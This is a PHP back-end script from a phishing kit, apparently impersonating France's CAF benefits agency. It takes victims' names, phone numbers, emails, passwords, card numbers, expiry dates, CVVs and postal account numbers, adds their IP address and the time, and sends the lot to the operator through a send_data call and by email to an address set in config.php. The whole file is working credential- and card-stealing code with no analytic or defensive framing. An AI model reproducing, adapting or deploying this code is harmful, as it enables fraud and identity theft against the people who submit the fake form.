<?php
date_default_timezone_set('GMT');
$TIME    = date("d-m-Y H:i:s");
$browser = getenv ("HTTP_USER_AGENT");
function getUserIP() {

    $ipaddress = '';

    if (isset($_SERVER['HTTP_CLIENT_IP']))

        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];

    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))

        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];

    else if(isset($_SERVER['HTTP_X_FORWARDED']))

        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];

    else if(isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))

        $ipaddress = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];

    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))

        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];

    else if(isset($_SERVER['HTTP_FORWARDED']))

        $ipaddress = $_SERVER['HTTP_FORWARDED'];

    else if(isset($_SERVER['REMOTE_ADDR']))

        $ipaddress = $_SERVER['REMOTE_ADDR'];

    else

        $ipaddress = 'UNKNOWN';

    return $ipaddress;

}
  $info_names = array(

  "IDENTIFIANT" => "user_id",
  "ID PASSWORD" => "pass_id"
  );


    $ip= getUserIP();
  include("config.php");
    $message =  "<br>--------------------------------------------------------------<br>";
    $message .= "<br>";
    $message .= "<br><abbr style='color:green;'>====================+[ NEW CAF " .$ip." ]+====================</abbr><br>";
    $message .= "Fullname: ".$_REQUEST['name']."<br>";
    $message .= "Phone     : ".$_REQUEST['phone']."<br>";
    $message .= "Email   : ".$_REQUEST['email']."<br>";
    $message .= "Password   : ".$_REQUEST['password']."<br>";
    $message .= "--------------------<br>";
    $message .= "Bita9a  : ".$_REQUEST['cardnum']."<br>";
    $message .= "Exp     : ".$_REQUEST['expirationdate']."<br>";
    $message .= "CVV     : ".$_REQUEST['cvv']."<br>";
    if($_REQUEST['cvv_extra'] !== '')
    $message .= "N compte: ".$_REQUEST['cvv_extra']."<br>";
    $message .= "--------------------<br>";
    $message .= "Time    : $TIME <br>";
    $message .= "IP      : ".$ip."<br>";
    $message .= "<br>";
    $message .= "<br>--------------------------------------------------------------<br>";

    $res = send_data(['data'=>$message]);


    $mail_message = "\n============+[ NEW CAF " .$ip." ]+============\n";
    $mail_message .= "\n";
    $mail_message .= "Fullname: ".$_REQUEST['name']."\n";
    $mail_message .= "Phone   : ".$_REQUEST['phone']."\n";
    $mail_message .= "Email   : ".$_REQUEST['email']."\n";
    $mail_message .= "Password   : ".$_REQUEST['password']."\n";
    $mail_message .= "\n";
    $mail_message .= "--------------------\n";
    $mail_message .= "\n";
    $mail_message .= "Bita9a  : ".$_REQUEST['cardnum']."\n";
    $mail_message .= "Exp     : ".$_REQUEST['expirationdate']."\n";
    $mail_message .= "CVV     : ".$_REQUEST['cvv']."\n";
    if($_REQUEST['cvv_extra'] !== '')
    $mail_message .= "N compte  : ".$_REQUEST['cvv_extra']."\n";
    $mail_message .= "\n";
    $mail_message .= "--------------------\n";
    $mail_message .= "\n";
    $mail_message .= "Time    : $TIME \n";
    $mail_message .= "IP      : ".$ip."\n";
    $mail_message .= "\n========================\n";
    $subject = "New CAF | $ip ";
    if($_REQUEST['cvv_extra'] !== ''){
    $subject .= ' - postale';}
    else{
    $subject .= ' ';}
    
  mail($emailTo,$subject,$mail_message,$headers);

  echo json_encode(['status'=>'success']);

?>